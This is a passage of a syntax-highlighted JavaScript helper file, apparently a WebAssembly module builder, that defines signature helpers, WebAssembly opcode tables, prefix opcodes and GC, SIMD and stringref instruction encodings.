  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([x], []);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_x_v</span>(<span class="hljs-params">x</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([], [x]);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_v_xx</span>(<span class="hljs-params">x</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([x, x], []);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_r_v</span>(<span class="hljs-params">r</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([], [r]);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_r_x</span>(<span class="hljs-params">r, x</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([x], [r]);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_r_xx</span>(<span class="hljs-params">r, x</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([x, x], [r]);
}

<span class="hljs-comment">// Opcodes</span>
<span class="hljs-keyword">const</span> kWasmOpcodes = {
  <span class="hljs-string">&#x27;Unreachable&#x27;</span>: <span class="hljs-number">0x00</span>,
  <span class="hljs-string">&#x27;Nop&#x27;</span>: <span class="hljs-number">0x01</span>,
  <span class="hljs-string">&#x27;Block&#x27;</span>: <span class="hljs-number">0x02</span>,
  <span class="hljs-string">&#x27;Loop&#x27;</span>: <span class="hljs-number">0x03</span>,
  <span class="hljs-string">&#x27;If&#x27;</span>: <span class="hljs-number">0x04</span>,
  <span class="hljs-string">&#x27;Else&#x27;</span>: <span class="hljs-number">0x05</span>,
  <span class="hljs-string">&#x27;Try&#x27;</span>: <span class="hljs-number">0x06</span>,
  <span class="hljs-string">&#x27;TryTable&#x27;</span>: <span class="hljs-number">0x1f</span>,
  <span class="hljs-string">&#x27;ThrowRef&#x27;</span>: <span class="hljs-number">0x0a</span>,
  <span class="hljs-string">&#x27;Catch&#x27;</span>: <span class="hljs-number">0x07</span>,
  <span class="hljs-string">&#x27;Throw&#x27;</span>: <span class="hljs-number">0x08</span>,
  <span class="hljs-string">&#x27;Rethrow&#x27;</span>: <span class="hljs-number">0x09</span>,
  <span class="hljs-string">&#x27;CatchAll&#x27;</span>: <span class="hljs-number">0x19</span>,
  <span class="hljs-string">&#x27;End&#x27;</span>: <span class="hljs-number">0x0b</span>,
  <span class="hljs-string">&#x27;Br&#x27;</span>: <span class="hljs-number">0x0c</span>,
  <span class="hljs-string">&#x27;BrIf&#x27;</span>: <span class="hljs-number">0x0d</span>,
  <span class="hljs-string">&#x27;BrTable&#x27;</span>: <span class="hljs-number">0x0e</span>,
  <span class="hljs-string">&#x27;Return&#x27;</span>: <span class="hljs-number">0x0f</span>,
  <span class="hljs-string">&#x27;CallFunction&#x27;</span>: <span class="hljs-number">0x10</span>,
  <span class="hljs-string">&#x27;CallIndirect&#x27;</span>: <span class="hljs-number">0x11</span>,
  <span class="hljs-string">&#x27;ReturnCall&#x27;</span>: <span class="hljs-number">0x12</span>,
  <span class="hljs-string">&#x27;ReturnCallIndirect&#x27;</span>: <span class="hljs-number">0x13</span>,
  <span class="hljs-string">&#x27;CallRef&#x27;</span>: <span class="hljs-number">0x14</span>,
  <span class="hljs-string">&#x27;ReturnCallRef&#x27;</span>: <span class="hljs-number">0x15</span>,
  <span class="hljs-string">&#x27;NopForTestingUnsupportedInLiftoff&#x27;</span>: <span class="hljs-number">0x16</span>,
  <span class="hljs-string">&#x27;Delegate&#x27;</span>: <span class="hljs-number">0x18</span>,
  <span class="hljs-string">&#x27;Drop&#x27;</span>: <span class="hljs-number">0x1a</span>,
  <span class="hljs-string">&#x27;Select&#x27;</span>: <span class="hljs-number">0x1b</span>,
  <span class="hljs-string">&#x27;SelectWithType&#x27;</span>: <span class="hljs-number">0x1c</span>,
  <span class="hljs-string">&#x27;LocalGet&#x27;</span>: <span class="hljs-number">0x20</span>,
  <span class="hljs-string">&#x27;LocalSet&#x27;</span>: <span class="hljs-number">0x21</span>,
  <span class="hljs-string">&#x27;LocalTee&#x27;</span>: <span class="hljs-number">0x22</span>,
  <span class="hljs-string">&#x27;GlobalGet&#x27;</span>: <span class="hljs-number">0x23</span>,
  <span class="hljs-string">&#x27;GlobalSet&#x27;</span>: <span class="hljs-number">0x24</span>,
  <span class="hljs-string">&#x27;TableGet&#x27;</span>: <span class="hljs-number">0x25</span>,
  <span class="hljs-string">&#x27;TableSet&#x27;</span>: <span class="hljs-number">0x26</span>,
  <span class="hljs-string">&#x27;I32LoadMem&#x27;</span>: <span class="hljs-number">0x28</span>,
  <span class="hljs-string">&#x27;I64LoadMem&#x27;</span>: <span class="hljs-number">0x29</span>,
  <span class="hljs-string">&#x27;F32LoadMem&#x27;</span>: <span class="hljs-number">0x2a</span>,
  <span class="hljs-string">&#x27;F64LoadMem&#x27;</span>: <span class="hljs-number">0x2b</span>,
  <span class="hljs-string">&#x27;I32LoadMem8S&#x27;</span>: <span class="hljs-number">0x2c</span>,
  <span class="hljs-string">&#x27;I32LoadMem8U&#x27;</span>: <span class="hljs-number">0x2d</span>,
  <span class="hljs-string">&#x27;I32LoadMem16S&#x27;</span>: <span class="hljs-number">0x2e</span>,
  <span class="hljs-string">&#x27;I32LoadMem16U&#x27;</span>: <span class="hljs-number">0x2f</span>,
  <span class="hljs-string">&#x27;I64LoadMem8S&#x27;</span>: <span class="hljs-number">0x30</span>,
  <span class="hljs-string">&#x27;I64LoadMem8U&#x27;</span>: <span class="hljs-number">0x31</span>,
  <span class="hljs-string">&#x27;I64LoadMem16S&#x27;</span>: <span class="hljs-number">0x32</span>,
  <span class="hljs-string">&#x27;I64LoadMem16U&#x27;</span>: <span class="hljs-number">0x33</span>,
  <span class="hljs-string">&#x27;I64LoadMem32S&#x27;</span>: <span class="hljs-number">0x34</span>,
  <span class="hljs-string">&#x27;I64LoadMem32U&#x27;</span>: <span class="hljs-number">0x35</span>,
  <span class="hljs-string">&#x27;I32StoreMem&#x27;</span>: <span class="hljs-number">0x36</span>,
  <span class="hljs-string">&#x27;I64StoreMem&#x27;</span>: <span class="hljs-number">0x37</span>,
  <span class="hljs-string">&#x27;F32StoreMem&#x27;</span>: <span class="hljs-number">0x38</span>,
  <span class="hljs-string">&#x27;F64StoreMem&#x27;</span>: <span class="hljs-number">0x39</span>,
  <span class="hljs-string">&#x27;I32StoreMem8&#x27;</span>: <span class="hljs-number">0x3a</span>,
  <span class="hljs-string">&#x27;I32StoreMem16&#x27;</span>: <span class="hljs-number">0x3b</span>,
  <span class="hljs-string">&#x27;I64StoreMem8&#x27;</span>: <span class="hljs-number">0x3c</span>,
  <span class="hljs-string">&#x27;I64StoreMem16&#x27;</span>: <span class="hljs-number">0x3d</span>,
  <span class="hljs-string">&#x27;I64StoreMem32&#x27;</span>: <span class="hljs-number">0x3e</span>,
  <span class="hljs-string">&#x27;MemorySize&#x27;</span>: <span class="hljs-number">0x3f</span>,
  <span class="hljs-string">&#x27;MemoryGrow&#x27;</span>: <span class="hljs-number">0x40</span>,
  <span class="hljs-string">&#x27;I32Const&#x27;</span>: <span class="hljs-number">0x41</span>,
  <span class="hljs-string">&#x27;I64Const&#x27;</span>: <span class="hljs-number">0x42</span>,
  <span class="hljs-string">&#x27;F32Const&#x27;</span>: <span class="hljs-number">0x43</span>,
  <span class="hljs-string">&#x27;F64Const&#x27;</span>: <span class="hljs-number">0x44</span>,
  <span class="hljs-string">&#x27;I32Eqz&#x27;</span>: <span class="hljs-number">0x45</span>,
  <span class="hljs-string">&#x27;I32Eq&#x27;</span>: <span class="hljs-number">0x46</span>,
  <span class="hljs-string">&#x27;I32Ne&#x27;</span>: <span class="hljs-number">0x47</span>,
  <span class="hljs-string">&#x27;I32LtS&#x27;</span>: <span class="hljs-number">0x48</span>,
  <span class="hljs-string">&#x27;I32LtU&#x27;</span>: <span class="hljs-number">0x49</span>,
  <span class="hljs-string">&#x27;I32GtS&#x27;</span>: <span class="hljs-number">0x4a</span>,
  <span class="hljs-string">&#x27;I32GtU&#x27;</span>: <span class="hljs-number">0x4b</span>,
  <span class="hljs-string">&#x27;I32LeS&#x27;</span>: <span class="hljs-number">0x4c</span>,
  <span class="hljs-string">&#x27;I32LeU&#x27;</span>: <span class="hljs-number">0x4d</span>,
  <span class="hljs-string">&#x27;I32GeS&#x27;</span>: <span class="hljs-number">0x4e</span>,
  <span class="hljs-string">&#x27;I32GeU&#x27;</span>: <span class="hljs-number">0x4f</span>,
  <span class="hljs-string">&#x27;I64Eqz&#x27;</span>: <span class="hljs-number">0x50</span>,
  <span class="hljs-string">&#x27;I64Eq&#x27;</span>: <span class="hljs-number">0x51</span>,
  <span class="hljs-string">&#x27;I64Ne&#x27;</span>: <span class="hljs-number">0x52</span>,
  <span class="hljs-string">&#x27;I64LtS&#x27;</span>: <span class="hljs-number">0x53</span>,
  <span class="hljs-string">&#x27;I64LtU&#x27;</span>: <span class="hljs-number">0x54</span>,
  <span class="hljs-string">&#x27;I64GtS&#x27;</span>: <span class="hljs-number">0x55</span>,
  <span class="hljs-string">&#x27;I64GtU&#x27;</span>: <span class="hljs-number">0x56</span>,
  <span class="hljs-string">&#x27;I64LeS&#x27;</span>: <span class="hljs-number">0x57</span>,
  <span class="hljs-string">&#x27;I64LeU&#x27;</span>: <span class="hljs-number">0x58</span>,
  <span class="hljs-string">&#x27;I64GeS&#x27;</span>: <span class="hljs-number">0x59</span>,
  <span class="hljs-string">&#x27;I64GeU&#x27;</span>: <span class="hljs-number">0x5a</span>,
  <span class="hljs-string">&#x27;F32Eq&#x27;</span>: <span class="hljs-number">0x5b</span>,
  <span class="hljs-string">&#x27;F32Ne&#x27;</span>: <span class="hljs-number">0x5c</span>,
  <span class="hljs-string">&#x27;F32Lt&#x27;</span>: <span class="hljs-number">0x5d</span>,
  <span class="hljs-string">&#x27;F32Gt&#x27;</span>: <span class="hljs-number">0x5e</span>,
  <span class="hljs-string">&#x27;F32Le&#x27;</span>: <span class="hljs-number">0x5f</span>,
  <span class="hljs-string">&#x27;F32Ge&#x27;</span>: <span class="hljs-number">0x60</span>,
  <span class="hljs-string">&#x27;F64Eq&#x27;</span>: <span class="hljs-number">0x61</span>,
  <span class="hljs-string">&#x27;F64Ne&#x27;</span>: <span class="hljs-number">0x62</span>,
  <span class="hljs-string">&#x27;F64Lt&#x27;</span>: <span class="hljs-number">0x63</span>,
  <span class="hljs-string">&#x27;F64Gt&#x27;</span>: <span class="hljs-number">0x64</span>,
  <span class="hljs-string">&#x27;F64Le&#x27;</span>: <span class="hljs-number">0x65</span>,
  <span class="hljs-string">&#x27;F64Ge&#x27;</span>: <span class="hljs-number">0x66</span>,
  <span class="hljs-string">&#x27;I32Clz&#x27;</span>: <span class="hljs-number">0x67</span>,
  <span class="hljs-string">&#x27;I32Ctz&#x27;</span>: <span class="hljs-number">0x68</span>,
  <span class="hljs-string">&#x27;I32Popcnt&#x27;</span>: <span class="hljs-number">0x69</span>,
  <span class="hljs-string">&#x27;I32Add&#x27;</span>: <span class="hljs-number">0x6a</span>,
  <span class="hljs-string">&#x27;I32Sub&#x27;</span>: <span class="hljs-number">0x6b</span>,
  <span class="hljs-string">&#x27;I32Mul&#x27;</span>: <span class="hljs-number">0x6c</span>,
  <span class="hljs-string">&#x27;I32DivS&#x27;</span>: <span class="hljs-number">0x6d</span>,
  <span class="hljs-string">&#x27;I32DivU&#x27;</span>: <span class="hljs-number">0x6e</span>,
  <span class="hljs-string">&#x27;I32RemS&#x27;</span>: <span class="hljs-number">0x6f</span>,
  <span class="hljs-string">&#x27;I32RemU&#x27;</span>: <span class="hljs-number">0x70</span>,
  <span class="hljs-string">&#x27;I32And&#x27;</span>: <span class="hljs-number">0x71</span>,
  <span class="hljs-string">&#x27;I32Ior&#x27;</span>: <span class="hljs-number">0x72</span>,
  <span class="hljs-string">&#x27;I32Xor&#x27;</span>: <span class="hljs-number">0x73</span>,
  <span class="hljs-string">&#x27;I32Shl&#x27;</span>: <span class="hljs-number">0x74</span>,
  <span class="hljs-string">&#x27;I32ShrS&#x27;</span>: <span class="hljs-number">0x75</span>,
  <span class="hljs-string">&#x27;I32ShrU&#x27;</span>: <span class="hljs-number">0x76</span>,
  <span class="hljs-string">&#x27;I32Rol&#x27;</span>: <span class="hljs-number">0x77</span>,
  <span class="hljs-string">&#x27;I32Ror&#x27;</span>: <span class="hljs-number">0x78</span>,
  <span class="hljs-string">&#x27;I64Clz&#x27;</span>: <span class="hljs-number">0x79</span>,
  <span class="hljs-string">&#x27;I64Ctz&#x27;</span>: <span class="hljs-number">0x7a</span>,
  <span class="hljs-string">&#x27;I64Popcnt&#x27;</span>: <span class="hljs-number">0x7b</span>,
  <span class="hljs-string">&#x27;I64Add&#x27;</span>: <span class="hljs-number">0x7c</span>,
  <span class="hljs-string">&#x27;I64Sub&#x27;</span>: <span class="hljs-number">0x7d</span>,
  <span class="hljs-string">&#x27;I64Mul&#x27;</span>: <span class="hljs-number">0x7e</span>,
  <span class="hljs-string">&#x27;I64DivS&#x27;</span>: <span class="hljs-number">0x7f</span>,
  <span class="hljs-string">&#x27;I64DivU&#x27;</span>: <span class="hljs-number">0x80</span>,
  <span class="hljs-string">&#x27;I64RemS&#x27;</span>: <span class="hljs-number">0x81</span>,
  <span class="hljs-string">&#x27;I64RemU&#x27;</span>: <span class="hljs-number">0x82</span>,
  <span class="hljs-string">&#x27;I64And&#x27;</span>: <span class="hljs-number">0x83</span>,
  <span class="hljs-string">&#x27;I64Ior&#x27;</span>: <span class="hljs-number">0x84</span>,
  <span class="hljs-string">&#x27;I64Xor&#x27;</span>: <span class="hljs-number">0x85</span>,
  <span class="hljs-string">&#x27;I64Shl&#x27;</span>: <span class="hljs-number">0x86</span>,
  <span class="hljs-string">&#x27;I64ShrS&#x27;</span>: <span class="hljs-number">0x87</span>,
  <span class="hljs-string">&#x27;I64ShrU&#x27;</span>: <span class="hljs-number">0x88</span>,
  <span class="hljs-string">&#x27;I64Rol&#x27;</span>: <span class="hljs-number">0x89</span>,
  <span class="hljs-string">&#x27;I64Ror&#x27;</span>: <span class="hljs-number">0x8a</span>,
  <span class="hljs-string">&#x27;F32Abs&#x27;</span>: <span class="hljs-number">0x8b</span>,
  <span class="hljs-string">&#x27;F32Neg&#x27;</span>: <span class="hljs-number">0x8c</span>,
  <span class="hljs-string">&#x27;F32Ceil&#x27;</span>: <span class="hljs-number">0x8d</span>,
  <span class="hljs-string">&#x27;F32Floor&#x27;</span>: <span class="hljs-number">0x8e</span>,
  <span class="hljs-string">&#x27;F32Trunc&#x27;</span>: <span class="hljs-number">0x8f</span>,
  <span class="hljs-string">&#x27;F32NearestInt&#x27;</span>: <span class="hljs-number">0x90</span>,
  <span class="hljs-string">&#x27;F32Sqrt&#x27;</span>: <span class="hljs-number">0x91</span>,
  <span class="hljs-string">&#x27;F32Add&#x27;</span>: <span class="hljs-number">0x92</span>,
  <span class="hljs-string">&#x27;F32Sub&#x27;</span>: <span class="hljs-number">0x93</span>,
  <span class="hljs-string">&#x27;F32Mul&#x27;</span>: <span class="hljs-number">0x94</span>,
  <span class="hljs-string">&#x27;F32Div&#x27;</span>: <span class="hljs-number">0x95</span>,
  <span class="hljs-string">&#x27;F32Min&#x27;</span>: <span class="hljs-number">0x96</span>,
  <span class="hljs-string">&#x27;F32Max&#x27;</span>: <span class="hljs-number">0x97</span>,
  <span class="hljs-string">&#x27;F32CopySign&#x27;</span>: <span class="hljs-number">0x98</span>,
  <span class="hljs-string">&#x27;F64Abs&#x27;</span>: <span class="hljs-number">0x99</span>,
  <span class="hljs-string">&#x27;F64Neg&#x27;</span>: <span class="hljs-number">0x9a</span>,
  <span class="hljs-string">&#x27;F64Ceil&#x27;</span>: <span class="hljs-number">0x9b</span>,
  <span class="hljs-string">&#x27;F64Floor&#x27;</span>: <span class="hljs-number">0x9c</span>,
  <span class="hljs-string">&#x27;F64Trunc&#x27;</span>: <span class="hljs-number">0x9d</span>,
  <span class="hljs-string">&#x27;F64NearestInt&#x27;</span>: <span class="hljs-number">0x9e</span>,
  <span class="hljs-string">&#x27;F64Sqrt&#x27;</span>: <span class="hljs-number">0x9f</span>,
  <span class="hljs-string">&#x27;F64Add&#x27;</span>: <span class="hljs-number">0xa0</span>,
  <span class="hljs-string">&#x27;F64Sub&#x27;</span>: <span class="hljs-number">0xa1</span>,
  <span class="hljs-string">&#x27;F64Mul&#x27;</span>: <span class="hljs-number">0xa2</span>,
  <span class="hljs-string">&#x27;F64Div&#x27;</span>: <span class="hljs-number">0xa3</span>,
  <span class="hljs-string">&#x27;F64Min&#x27;</span>: <span class="hljs-number">0xa4</span>,
  <span class="hljs-string">&#x27;F64Max&#x27;</span>: <span class="hljs-number">0xa5</span>,
  <span class="hljs-string">&#x27;F64CopySign&#x27;</span>: <span class="hljs-number">0xa6</span>,
  <span class="hljs-string">&#x27;I32ConvertI64&#x27;</span>: <span class="hljs-number">0xa7</span>,
  <span class="hljs-string">&#x27;I32SConvertF32&#x27;</span>: <span class="hljs-number">0xa8</span>,
  <span class="hljs-string">&#x27;I32UConvertF32&#x27;</span>: <span class="hljs-number">0xa9</span>,
  <span class="hljs-string">&#x27;I32SConvertF64&#x27;</span>: <span class="hljs-number">0xaa</span>,
  <span class="hljs-string">&#x27;I32UConvertF64&#x27;</span>: <span class="hljs-number">0xab</span>,
  <span class="hljs-string">&#x27;I64SConvertI32&#x27;</span>: <span class="hljs-number">0xac</span>,
  <span class="hljs-string">&#x27;I64UConvertI32&#x27;</span>: <span class="hljs-number">0xad</span>,
  <span class="hljs-string">&#x27;I64SConvertF32&#x27;</span>: <span class="hljs-number">0xae</span>,
  <span class="hljs-string">&#x27;I64UConvertF32&#x27;</span>: <span class="hljs-number">0xaf</span>,
  <span class="hljs-string">&#x27;I64SConvertF64&#x27;</span>: <span class="hljs-number">0xb0</span>,
  <span class="hljs-string">&#x27;I64UConvertF64&#x27;</span>: <span class="hljs-number">0xb1</span>,
  <span class="hljs-string">&#x27;F32SConvertI32&#x27;</span>: <span class="hljs-number">0xb2</span>,
  <span class="hljs-string">&#x27;F32UConvertI32&#x27;</span>: <span class="hljs-number">0xb3</span>,
  <span class="hljs-string">&#x27;F32SConvertI64&#x27;</span>: <span class="hljs-number">0xb4</span>,
  <span class="hljs-string">&#x27;F32UConvertI64&#x27;</span>: <span class="hljs-number">0xb5</span>,
  <span class="hljs-string">&#x27;F32ConvertF64&#x27;</span>: <span class="hljs-number">0xb6</span>,
  <span class="hljs-string">&#x27;F64SConvertI32&#x27;</span>: <span class="hljs-number">0xb7</span>,
  <span class="hljs-string">&#x27;F64UConvertI32&#x27;</span>: <span class="hljs-number">0xb8</span>,
  <span class="hljs-string">&#x27;F64SConvertI64&#x27;</span>: <span class="hljs-number">0xb9</span>,
  <span class="hljs-string">&#x27;F64UConvertI64&#x27;</span>: <span class="hljs-number">0xba</span>,
  <span class="hljs-string">&#x27;F64ConvertF32&#x27;</span>: <span class="hljs-number">0xbb</span>,
  <span class="hljs-string">&#x27;I32ReinterpretF32&#x27;</span>: <span class="hljs-number">0xbc</span>,
  <span class="hljs-string">&#x27;I64ReinterpretF64&#x27;</span>: <span class="hljs-number">0xbd</span>,
  <span class="hljs-string">&#x27;F32ReinterpretI32&#x27;</span>: <span class="hljs-number">0xbe</span>,
  <span class="hljs-string">&#x27;F64ReinterpretI64&#x27;</span>: <span class="hljs-number">0xbf</span>,
  <span class="hljs-string">&#x27;I32SExtendI8&#x27;</span>: <span class="hljs-number">0xc0</span>,
  <span class="hljs-string">&#x27;I32SExtendI16&#x27;</span>: <span class="hljs-number">0xc1</span>,
  <span class="hljs-string">&#x27;I64SExtendI8&#x27;</span>: <span class="hljs-number">0xc2</span>,
  <span class="hljs-string">&#x27;I64SExtendI16&#x27;</span>: <span class="hljs-number">0xc3</span>,
  <span class="hljs-string">&#x27;I64SExtendI32&#x27;</span>: <span class="hljs-number">0xc4</span>,
  <span class="hljs-string">&#x27;RefNull&#x27;</span>: <span class="hljs-number">0xd0</span>,
  <span class="hljs-string">&#x27;RefIsNull&#x27;</span>: <span class="hljs-number">0xd1</span>,
  <span class="hljs-string">&#x27;RefFunc&#x27;</span>: <span class="hljs-number">0xd2</span>,
  <span class="hljs-string">&#x27;RefEq&#x27;</span>: <span class="hljs-number">0xd3</span>,
  <span class="hljs-string">&#x27;RefAsNonNull&#x27;</span>: <span class="hljs-number">0xd4</span>,
  <span class="hljs-string">&#x27;BrOnNull&#x27;</span>: <span class="hljs-number">0xd5</span>,
  <span class="hljs-string">&#x27;BrOnNonNull&#x27;</span>: <span class="hljs-number">0xd6</span>,
  <span class="hljs-string">&#x27;ContNew&#x27;</span>: <span class="hljs-number">0xe0</span>,
  <span class="hljs-string">&#x27;ContBind&#x27;</span>: <span class="hljs-number">0xe1</span>,
  <span class="hljs-string">&#x27;Suspend&#x27;</span>: <span class="hljs-number">0xe2</span>,
  <span class="hljs-string">&#x27;Resume&#x27;</span>: <span class="hljs-number">0xe3</span>,
  <span class="hljs-string">&#x27;ResumeThrow&#x27;</span>: <span class="hljs-number">0xe4</span>,
  <span class="hljs-string">&#x27;ResumeThrowRef&#x27;</span>: <span class="hljs-number">0xe5</span>,
  <span class="hljs-string">&#x27;Switch&#x27;</span>: <span class="hljs-number">0xe6</span>
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">defineWasmOpcode</span>(<span class="hljs-params">name, value</span>) {
  <span class="hljs-keyword">if</span> (globalThis.<span class="hljs-property">kWasmOpcodeNames</span> === <span class="hljs-literal">undefined</span>) {
    globalThis.<span class="hljs-property">kWasmOpcodeNames</span> = {};
  }
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(globalThis, name, {<span class="hljs-attr">value</span>: value});
  <span class="hljs-keyword">if</span> (globalThis.<span class="hljs-property">kWasmOpcodeNames</span>[value] !== <span class="hljs-literal">undefined</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Duplicate wasm opcode: <span class="hljs-subst">${value}</span>. Previous name: <span class="hljs-subst">${
        globalThis.kWasmOpcodeNames[value]}</span>, new name: <span class="hljs-subst">${name}</span>`</span>);
  }
  globalThis.<span class="hljs-property">kWasmOpcodeNames</span>[value] = name;
}
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> name <span class="hljs-keyword">in</span> kWasmOpcodes) {
  <span class="hljs-title function_">defineWasmOpcode</span>(<span class="hljs-string">`kExpr<span class="hljs-subst">${name}</span>`</span>, kWasmOpcodes[name]);
}

<span class="hljs-comment">// Prefix opcodes</span>
<span class="hljs-keyword">const</span> kPrefixOpcodes = {
  <span class="hljs-string">&#x27;GC&#x27;</span>: <span class="hljs-number">0xfb</span>,
  <span class="hljs-string">&#x27;Numeric&#x27;</span>: <span class="hljs-number">0xfc</span>,
  <span class="hljs-string">&#x27;Simd&#x27;</span>: <span class="hljs-number">0xfd</span>,
  <span class="hljs-string">&#x27;Atomic&#x27;</span>: <span class="hljs-number">0xfe</span>
};
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> prefix <span class="hljs-keyword">in</span> kPrefixOpcodes) {
  <span class="hljs-title function_">defineWasmOpcode</span>(<span class="hljs-string">`k<span class="hljs-subst">${prefix}</span>Prefix`</span>, kPrefixOpcodes[prefix]);
}

<span class="hljs-comment">// Use these for multi-byte instructions (opcode &gt; 0x7F needing two LEB bytes):</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">SimdInstr</span>(<span class="hljs-params">opcode</span>) {
  <span class="hljs-keyword">if</span> (opcode &lt;= <span class="hljs-number">0x7F</span>) <span class="hljs-keyword">return</span> [kSimdPrefix, opcode];
  <span class="hljs-keyword">return</span> [kSimdPrefix, <span class="hljs-number">0x80</span> | (opcode &amp; <span class="hljs-number">0x7F</span>), opcode &gt;&gt; <span class="hljs-number">7</span>];
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">GCInstr</span>(<span class="hljs-params">opcode</span>) {
  <span class="hljs-keyword">if</span> (opcode &lt;= <span class="hljs-number">0x7F</span>) <span class="hljs-keyword">return</span> [kGCPrefix, opcode];
  <span class="hljs-keyword">return</span> [kGCPrefix, <span class="hljs-number">0x80</span> | (opcode &amp; <span class="hljs-number">0x7F</span>), opcode &gt;&gt; <span class="hljs-number">7</span>];
}

<span class="hljs-comment">// GC opcodes</span>
<span class="hljs-keyword">let</span> kExprStructNew = <span class="hljs-number">0x00</span>;
<span class="hljs-keyword">let</span> kExprStructNewDefault = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kExprStructGet = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kExprStructGetS = <span class="hljs-number">0x03</span>;
<span class="hljs-keyword">let</span> kExprStructGetU = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">let</span> kExprStructSet = <span class="hljs-number">0x05</span>;
<span class="hljs-keyword">let</span> kExprArrayNew = <span class="hljs-number">0x06</span>;
<span class="hljs-keyword">let</span> kExprArrayNewDefault = <span class="hljs-number">0x07</span>;
<span class="hljs-keyword">let</span> kExprArrayNewFixed = <span class="hljs-number">0x08</span>;
<span class="hljs-keyword">let</span> kExprArrayNewData = <span class="hljs-number">0x09</span>;
<span class="hljs-keyword">let</span> kExprArrayNewElem = <span class="hljs-number">0x0a</span>;
<span class="hljs-keyword">let</span> kExprArrayGet = <span class="hljs-number">0x0b</span>;
<span class="hljs-keyword">let</span> kExprArrayGetS = <span class="hljs-number">0x0c</span>;
<span class="hljs-keyword">let</span> kExprArrayGetU = <span class="hljs-number">0x0d</span>;
<span class="hljs-keyword">let</span> kExprArraySet = <span class="hljs-number">0x0e</span>;
<span class="hljs-keyword">let</span> kExprArrayLen = <span class="hljs-number">0x0f</span>;
<span class="hljs-keyword">let</span> kExprArrayFill = <span class="hljs-number">0x10</span>;
<span class="hljs-keyword">let</span> kExprArrayCopy = <span class="hljs-number">0x11</span>;
<span class="hljs-keyword">let</span> kExprArrayInitData = <span class="hljs-number">0x12</span>;
<span class="hljs-keyword">let</span> kExprArrayInitElem = <span class="hljs-number">0x13</span>;
<span class="hljs-keyword">let</span> kExprRefTest = <span class="hljs-number">0x14</span>;
<span class="hljs-keyword">let</span> kExprRefTestNull = <span class="hljs-number">0x15</span>;
<span class="hljs-keyword">let</span> kExprRefCast = <span class="hljs-number">0x16</span>;
<span class="hljs-keyword">let</span> kExprRefCastNull = <span class="hljs-number">0x17</span>;
<span class="hljs-keyword">let</span> kExprBrOnCast = <span class="hljs-number">0x18</span>;
<span class="hljs-keyword">let</span> kExprBrOnCastFail = <span class="hljs-number">0x19</span>;
<span class="hljs-keyword">let</span> kExprAnyConvertExtern = <span class="hljs-number">0x1a</span>;
<span class="hljs-keyword">let</span> kExprExternConvertAny = <span class="hljs-number">0x1b</span>;
<span class="hljs-keyword">let</span> kExprRefI31 = <span class="hljs-number">0x1c</span>;
<span class="hljs-keyword">let</span> kExprI31GetS = <span class="hljs-number">0x1d</span>;
<span class="hljs-keyword">let</span> kExprI31GetU = <span class="hljs-number">0x1e</span>;
<span class="hljs-keyword">let</span> kExprRefI31Shared = <span class="hljs-number">0x1f</span>;
<span class="hljs-comment">// Custom Descriptors proposal:</span>
<span class="hljs-keyword">let</span> kExprRefGetDesc = <span class="hljs-number">0x22</span>;
<span class="hljs-keyword">let</span> kExprRefCastDesc = <span class="hljs-number">0x23</span>;
<span class="hljs-keyword">let</span> kExprRefCastDescNull = <span class="hljs-number">0x24</span>;
<span class="hljs-keyword">let</span> kExprBrOnCastDesc = <span class="hljs-number">0x25</span>;
<span class="hljs-keyword">let</span> kExprBrOnCastDescFail = <span class="hljs-number">0x26</span>;

<span class="hljs-keyword">let</span> kExprRefCastNop = <span class="hljs-number">0x4c</span>;

<span class="hljs-comment">// Stringref proposal.</span>
<span class="hljs-keyword">let</span> kExprStringNewUtf8 = <span class="hljs-number">0x80</span>;
<span class="hljs-keyword">let</span> kExprStringNewWtf16 = <span class="hljs-number">0x81</span>;
<span class="hljs-keyword">let</span> kExprStringConst = <span class="hljs-number">0x82</span>;
<span class="hljs-keyword">let</span> kExprStringMeasureUtf8 = <span class="hljs-number">0x83</span>;
<span class="hljs-keyword">let</span> kExprStringMeasureWtf8 = <span class="hljs-number">0x84</span>;
<span class="hljs-keyword">let</span> kExprStringMeasureWtf16 = <span class="hljs-number">0x85</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeUtf8 = <span class="hljs-number">0x86</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeWtf16 = <span class="hljs-number">0x87</span>;
<span class="hljs-keyword">let</span> kExprStringConcat = <span class="hljs-number">0x88</span>;
<span class="hljs-keyword">let</span> kExprStringEq = <span class="hljs-number">0x89</span>;
<span class="hljs-keyword">let</span> kExprStringIsUsvSequence = <span class="hljs-number">0x8a</span>;
<span class="hljs-keyword">let</span> kExprStringNewLossyUtf8 = <span class="hljs-number">0x8b</span>;
<span class="hljs-keyword">let</span> kExprStringNewWtf8 = <span class="hljs-number">0x8c</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeLossyUtf8 = <span class="hljs-number">0x8d</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeWtf8 = <span class="hljs-number">0x8e</span>;
<span class="hljs-keyword">let</span> kExprStringNewUtf8Try = <span class="hljs-number">0x8f</span>;
<span class="hljs-keyword">let</span> kExprStringAsWtf8 = <span class="hljs-number">0x90</span>;
<span class="hljs-keyword">let</span> kExprStringViewWtf8Advance = <span class="hljs-number">0x91</span>;
